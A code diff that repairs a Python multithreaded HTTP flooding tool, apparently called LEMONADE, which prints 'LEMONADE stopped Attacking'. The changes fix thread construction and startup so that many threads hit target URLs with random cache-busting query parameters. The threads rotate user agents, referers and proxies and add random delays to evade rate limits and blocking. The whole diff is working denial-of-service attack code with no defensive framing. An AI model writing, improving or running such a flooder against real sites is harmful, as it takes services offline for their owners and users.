@@ -39,7 +39,7 @@ def requestcnt():
 def useragent_list():
     global config
     global useragents
-    with open(config["./useragents"],"r") as f:
+    with open(config["useragents"],"r") as f:
         useragent = f.read().split("\n")
     useragents = useragent
     return useragent
@@ -68,7 +68,7 @@ if(config["useconfigurl"] == False):
     host = []
     host.append(m.group(2))
 else:
-    url = config["url"]
+    url = list(config["url"])
     for i in range(len(url)):
         k = url[i]
         if str(k).count("/")==2:
@@ -91,8 +91,9 @@ referer_list()
 class httpcall(threading.Thread):
     def __init__(self):
         global config
+        threading.Thread.__init__(self)
         self.randomdelay = config["thread"]["randomdelay"]
-        self.payload = json.loads(config["payload"])
+        self.payload = json.loads(str(config["payload"]))
         self.useragents = useragents
         self.referers = referers
         self.limiter = config["thread"]["limiter"]
@@ -111,12 +112,12 @@ class httpcall(threading.Thread):
                 proxy = ""
                 if self.useproxies == True:
                     proxy = proxies.pop(0)
-
-                if self.url.count("?") > 0:
+                    
+                if url[k].count("?") > 0:
                     param_joiner = "&"
                 else:
                     param_joiner = "?"
-            
+                    
                 if proxy == "":
                     try:
                         lres = requests.request(self.method,f"{url[k]}{param_joiner}{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}",headers={
@@ -193,21 +194,23 @@ class httpcall(threading.Thread):
                 time.sleep(random.randint(self.mindelay,self.maxdelay) / 1000)
             else:
                 pass
-        httpcall.start()
+        httpcall().start()
         return
 
 class MonitorThread(threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
     def run(self):
         while True:
             global request_counter
             print(f"Summary Requested: {request_counter}")
             time.sleep(15)
-
+MonitorThread().start()
 for i in range(thrd):
-    httpcall.start()
-
+    httpcall().start()
 try:
     while True:
+        #print(f"Summary Requested: {request_counter}")
         if flag == 2:
             print("LEMONADE stopped Attacking")
             sys.exit()
